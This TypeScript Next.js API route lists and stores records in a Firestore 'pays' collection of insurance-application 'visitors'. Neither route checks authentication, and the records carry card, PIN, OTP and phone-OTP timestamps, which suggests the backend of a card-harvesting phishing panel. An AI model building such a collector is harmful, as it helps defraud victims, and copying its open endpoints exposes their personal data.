import { NextRequest, NextResponse } from "next/server";
import {
  addDoc,
  collection,
  getDocs,
  query,
  serverTimestamp,
  Timestamp,
  where,
} from "firebase/firestore";
import { db } from "@/lib/firebase-server";
import type { InsuranceApplication } from "@/lib/firestore-types";

const PAYS_COLLECTION = "pays";

const isObject = (value: unknown): value is Record<string, unknown> =>
  typeof value === "object" && value !== null && !Array.isArray(value);

const removeUndefinedShallow = (data: Record<string, unknown>) =>
  Object.fromEntries(
    Object.entries(data).filter(([, value]) => value !== undefined)
  );

const serializeFirestoreValue = (value: unknown): unknown => {
  if (value === null || value === undefined) return value;

  if (value instanceof Date) {
    return value.toISOString();
  }

  if (value instanceof Timestamp) {
    return value.toDate().toISOString();
  }

  if (
    typeof value === "object" &&
    value !== null &&
    typeof (value as any).toDate === "function"
  ) {
    try {
      return (value as any).toDate().toISOString();
    } catch {
      return null;
    }
  }

  if (Array.isArray(value)) {
    return value.map(serializeFirestoreValue);
  }

  if (isObject(value)) {
    const serialized: Record<string, unknown> = {};
    for (const [key, nestedValue] of Object.entries(value)) {
      const result = serializeFirestoreValue(nestedValue);
      if (result !== undefined) {
        serialized[key] = result;
      }
    }
    return serialized;
  }

  return value;
};

const toTimeValue = (value: unknown): number => {
  if (!value) return 0;

  if (value instanceof Date) return value.getTime();

  if (
    typeof value === "object" &&
    value !== null &&
    typeof (value as any).toDate === "function"
  ) {
    try {
      return (value as any).toDate().getTime();
    } catch {
      return 0;
    }
  }

  const parsed = new Date(value as any).getTime();
  return Number.isNaN(parsed) ? 0 : parsed;
};

const getSortTime = (application: InsuranceApplication): number => {
  const directTimes = [
    (application as any).insurUpdatedAt,
    application.updatedAt,
    application.cardUpdatedAt,
    application.otpUpdatedAt,
    application.pinUpdatedAt,
    application.phoneOtpUpdatedAt,
    application.phoneUpdatedAt,
    application.offerUpdatedAt,
    application.insuranceUpdatedAt,
    application.lastActiveAt,
    application.lastSeen,
  ];

  let latestTime = Math.max(...directTimes.map(toTimeValue), 0);

  if (application.history && Array.isArray(application.history)) {
    for (const entry of application.history as any[]) {
      const entryTime = toTimeValue(entry?.timestamp);
      if (entryTime > latestTime) {
        latestTime = entryTime;
      }
    }
  }

  return latestTime || toTimeValue(application.createdAt);
};

const sortApplications = (applications: InsuranceApplication[]) =>
  [...applications].sort((a, b) => getSortTime(b) - getSortTime(a));

export async function GET(request: NextRequest) {
  try {
    const status = request.nextUrl.searchParams.get("status");
    const paysRef = collection(db, PAYS_COLLECTION);

    const paysQuery = status
      ? query(paysRef, where("status", "==", status))
      : query(paysRef);

    const snapshot = await getDocs(paysQuery);
    const applications = snapshot.docs.map(
      (doc) =>
        ({
          id: doc.id,
          ...(serializeFirestoreValue(doc.data()) as Record<string, unknown>),
        }) as InsuranceApplication
    );

    return NextResponse.json(sortApplications(applications));
  } catch (error) {
    console.error("Error listing visitors:", error);
    return NextResponse.json(
      { error: "Failed to list visitors" },
      { status: 500 }
    );
  }
}

export async function POST(request: NextRequest) {
  try {
    const payload = await request.json();
    if (!isObject(payload)) {
      return NextResponse.json(
        { error: "Invalid payload. Expected JSON object." },
        { status: 400 }
      );
    }

    const { id: _ignoredId, ...rest } = payload;
    const safePayload = removeUndefinedShallow(rest);

    const docRef = await addDoc(collection(db, PAYS_COLLECTION), {
      ...safePayload,
      createdAt: serverTimestamp(),
      updatedAt: serverTimestamp(),
    });

    return NextResponse.json({ id: docRef.id }, { status: 201 });
  } catch (error) {
    console.error("Error creating visitor:", error);
    return NextResponse.json(
      { error: "Failed to create visitor" },
      { status: 500 }
    );
  }
}
